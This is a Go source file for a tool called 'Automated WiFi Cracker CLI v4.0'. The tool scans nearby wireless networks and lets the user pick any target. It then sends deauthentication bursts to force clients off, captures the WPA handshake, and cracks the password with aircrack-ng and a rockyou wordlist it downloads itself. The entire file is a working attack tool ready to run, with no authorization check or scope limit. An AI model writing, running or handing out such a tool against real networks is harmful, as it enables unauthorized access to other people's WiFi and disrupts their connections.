package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/fatih/color"
)

// ==========================================
// Data Models
// ==========================================
type Network struct {
	BSSID  string
	CH     string
	ESSID  string
	Sec    string
	Client string
}

// ==========================================
// Global State & UI Colors
// ==========================================
var (
	cyan   = color.New(color.FgCyan, color.Bold)
	green  = color.New(color.FgGreen, color.Bold)
	yellow = color.New(color.FgYellow, color.Bold)
	red    = color.New(color.FgRed, color.Bold)
	white  = color.New(color.FgWhite, color.Bold)

	monIface   string
	activeCmds []*exec.Cmd
)

// ==========================================
// Main Entry Point
// ==========================================
func main() {
	setupSignalHandler()

	if os.Geteuid() != 0 {
		red.Println("[!] ERROR: This tool requires root privileges. Please run with 'sudo'.")
		os.Exit(1)
	}

	cyan.Println("=======================================")
	cyan.Println("    Automated WiFi Cracker CLI v4.0   ")
	cyan.Println("=======================================")

	setupEnvironment()

	reader := bufio.NewReader(os.Stdin)

	white.Print("\n[*] Enter Wireless Interface (e.g., wlp1s0): ")
	iface, err := reader.ReadString('\n')
	if err != nil {
		red.Printf("[-] Failed to read input: %v\n", err)
		os.Exit(1)
	}
	iface = strings.TrimSpace(iface)
	if iface == "" {
		red.Println("[-] Interface name cannot be empty.")
		os.Exit(1)
	}

	monIface = iface + "mon"

	yellow.Println("\n[*] Enabling Monitor Mode...")
	runCmd("airmon-ng", "check", "kill")
	runCmd("airmon-ng", "start", iface)
	green.Println("[+] Monitor Mode enabled successfully.")

	defer cleanup()

	networks := scanNetworks()
	target := selectTarget(networks, reader)

	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_")
	targetDir := filepath.Join("data", sanitizedEssid)

	yellow.Printf("\n[*] Creating directory for target: %s\n", targetDir)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		red.Printf("[-] ERROR: Failed to create directory: %v\n", err)
		os.Exit(1)
	}
	green.Println("[+] Directory ready.")

	capFile := filepath.Join(targetDir, "handshake")

	// New Robust Handshake Capture Logic
	captureHandshake(target, capFile)

	// Verify if handshake was actually captured
	if !verifyHandshake(capFile) {
		red.Println("\n[-] CRITICAL ERROR: Handshake NOT captured.")
		red.Println("[-] Reason: No device reconnected during the attack, or no client was connected to the router.")
		red.Println("[-] Suggestion: Connect a device to this WiFi manually, then run the script again.")
		cleanup()
		os.Exit(1)
	}

	green.Println("[+] Valid Handshake Captured Successfully!")
	crackPassword(capFile, targetDir)
	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
}

// ==========================================
// Core Attack Functions
// ==========================================

func captureHandshake(target Network, capFile string) {
	yellow.Println("\n[*] Starting Handshake Capture (Listening for 40 seconds)...")

	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		red.Printf("[-] Failed to start capture: %v\n", err)
		cleanup()
		os.Exit(1)
	}
	activeCmds = append(activeCmds, cmd)

	time.Sleep(3 * time.Second) // Wait for airodump to lock channel

	// Deauth Loop: Send bursts of deauth to increase chance of catching handshake
	for i := 1; i <= 3; i++ {
		yellow.Printf("[*] Sending Deauth Burst %d/3 (5 seconds each)...\n", i)

		deauthArgs := []string{"--deauth", "5", "-a", target.BSSID, monIface}
		if target.Client != "" {
			deauthArgs = append(deauthArgs, "-c", target.Client)
		} else {
			yellow.Println("[!] No specific client found. Sending broadcast deauth (might be less effective).")
		}

		runCmd("aireplay-ng", deauthArgs...)
		time.Sleep(5 * time.Second)
	}

	// Wait a final few seconds to ensure the .cap file is written
	time.Sleep(5 * time.Second)

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}
	green.Println("[+] Capture phase completed.")
}

func verifyHandshake(capFile string) bool {
	finalCapFile := capFile + "-01.cap"

	// Run aircrack-ng without a wordlist just to check if handshake exists
	cmd := exec.Command("aircrack-ng", finalCapFile)
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	cmd.Run()

	outputStr := buf.String()
	// Aircrack outputs "1 handshake" if captured, or "0 handshake" if not.
	return strings.Contains(outputStr, "1 handshake")
}

func crackPassword(capFile string, targetDir string) {
	finalCapFile := capFile + "-01.cap"
	cores := runtime.NumCPU()

	cyan.Println("\n=======================================")
	cyan.Println("       Starting Password Cracking      ")
	cyan.Println("=======================================")
	yellow.Printf("[*] File: %s\n", finalCapFile)
	yellow.Printf("[*] Wordlist: rockyou_clean.txt (Passwords < 8 chars removed)\n")
	yellow.Printf("[*] CPU Threads: %d (Multi-threading Enabled)\n", cores)
	fmt.Println()

	cmd := exec.Command("aircrack-ng", "-p", fmt.Sprintf("%d", cores), "-w", "/usr/share/wordlists/rockyou_clean.txt", finalCapFile)

	var buf bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)

	cmd.Run()

	outputStr := buf.String()
	if strings.Contains(outputStr, "KEY FOUND!") {
		startIndex := strings.Index(outputStr, "KEY FOUND! [")
		if startIndex != -1 {
			restStr := outputStr[startIndex+len("KEY FOUND! ["):]
			endIndex := strings.Index(restStr, "]")
			if endIndex != -1 {
				password := restStr[:endIndex]

				fmt.Println()
				green.Println("=======================================")
				green.Printf("🎯  PASSWORD FOUND: %s  🎯\n", password)
				green.Println("=======================================")
				fmt.Println()
			}
		}
	} else {
		red.Println("\n[-] Password not found in the wordlist.")
	}
}

// ==========================================
// Scanning & Parsing
// ==========================================

func scanNetworks() []Network {
	yellow.Println("\n[*] Scanning networks for 15 seconds...")
	scanFile := "scan_temp"
	os.Remove(scanFile + "-01.csv")

	cmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		red.Printf("[-] Failed to start airodump-ng: %v\n", err)
		cleanup()
		os.Exit(1)
	}
	activeCmds = append(activeCmds, cmd)

	time.Sleep(15 * time.Second)

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}
	green.Println("[+] Scan completed.")

	networks := parseCSV(scanFile + "-01.csv")
	if len(networks) == 0 {
		red.Println("[-] ERROR: No networks found or CSV file not generated.")
		cleanup()
		os.Exit(1)
	}

	fmt.Println()
	cyan.Println("=== Discovered WiFi Networks ===")
	for i, net := range networks {
		fmt.Printf("[%d] ESSID: %s | BSSID: %s | CH: %s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
	}

	return networks
}

func selectTarget(networks []Network, reader *bufio.Reader) Network {
	for {
		white.Print("\n[*] Enter the number of the target network: ")
		input, err := reader.ReadString('\n')
		if err != nil {
			red.Printf("[-] Failed to read input: %v\n", err)
			cleanup()
			os.Exit(1)
		}

		input = strings.TrimSpace(input)
		choice, err := strconv.Atoi(input)

		if err != nil || choice < 1 || choice > len(networks) {
			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
			continue
		}

		target := networks[choice-1]
		yellow.Printf("\n[*] Target Selected: %s (%s)\n", target.ESSID, target.BSSID)
		return target
	}
}

func parseCSV(filename string) []Network {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()

	var networks []Network
	scanner := bufio.NewScanner(file)
	isStation := false

	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "Station MAC") {
			isStation = true
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}

		if !isStation {
			bssid := strings.TrimSpace(parts[0])
			ch := strings.TrimSpace(parts[3])
			sec := strings.TrimSpace(parts[5])
			essid := strings.TrimSpace(parts[13])
			if bssid != "" && essid != "" {
				networks = append(networks, Network{
					BSSID: bssid,
					CH:    ch,
					ESSID: essid,
					Sec:   sec,
				})
			}
		} else {
			stationMac := strings.TrimSpace(parts[0])
			targetBSSID := strings.TrimSpace(parts[5])
			for i := range networks {
				if networks[i].BSSID == targetBSSID && networks[i].Client == "" {
					networks[i].Client = stationMac
					break
				}
			}
		}
	}
	return networks
}

// ==========================================
// Environment Setup
// ==========================================

func setupEnvironment() {
	yellow.Println("\n[*] Checking environment dependencies...")

	if _, err := exec.LookPath("aircrack-ng"); err != nil {
		red.Println("[-] aircrack-ng not found. Installing...")
		runCmd("apt", "update")
		runCmd("apt", "install", "aircrack-ng", "-y")
	} else {
		green.Println("[+] aircrack-ng is already installed.")
	}

	if _, err := exec.LookPath("wget"); err != nil {
		red.Println("[-] wget not found. Installing...")
		runCmd("apt", "install", "wget", "-y")
	}

	wordlistPath := "/usr/share/wordlists/rockyou.txt"
	if _, err := os.Stat(wordlistPath); os.IsNotExist(err) {
		red.Println("[-] rockyou.txt not found. Downloading (130MB)...")
		runCmd("mkdir", "-p", "/usr/share/wordlists")
		runCmd("wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "-O", wordlistPath)
		green.Println("[+] rockyou.txt downloaded successfully.")
	} else {
		green.Println("[+] rockyou.txt is already downloaded.")
	}

	cleanWordlistPath := "/usr/share/wordlists/rockyou_clean.txt"
	if _, err := os.Stat(cleanWordlistPath); os.IsNotExist(err) {
		yellow.Println("[*] Optimizing Wordlist: Removing passwords shorter than 8 characters...")
		cleanFile, err := os.Create(cleanWordlistPath)
		if err != nil {
			red.Printf("[-] Failed to create clean wordlist: %v\n", err)
			return
		}
		defer cleanFile.Close()

		awkCmd := exec.Command("awk", "length>=8", wordlistPath)
		awkCmd.Stdout = cleanFile
		awkCmd.Stderr = os.Stderr
		if err := awkCmd.Run(); err != nil {
			red.Printf("[-] Wordlist optimization failed: %v\n", err)
		} else {
			green.Println("[+] Optimization complete. 'rockyou_clean.txt' created.")
		}
	} else {
		green.Println("[+] Optimized wordlist 'rockyou_clean.txt' is ready.")
	}
}

// ==========================================
// System & Cleanup Utilities
// ==========================================

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println()
		red.Println("\n[!] Interrupted by user. Cleaning up...")
		cleanup()
		os.Exit(1)
	}()
}

func cleanup() {
	yellow.Println("\n[*] Performing cleanup operations...")

	for _, cmd := range activeCmds {
		if cmd != nil && cmd.Process != nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}
	activeCmds = nil

	if monIface != "" {
		yellow.Printf("[*] Disabling monitor mode on %s...\n", monIface)
		runCmd("airmon-ng", "stop", monIface)
	}

	yellow.Println("[*] Restarting NetworkManager...")
	runCmd("systemctl", "start", "NetworkManager")

	os.Remove("scan_temp-01.csv")

	green.Println("[+] Cleanup complete.")
}

func runCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}
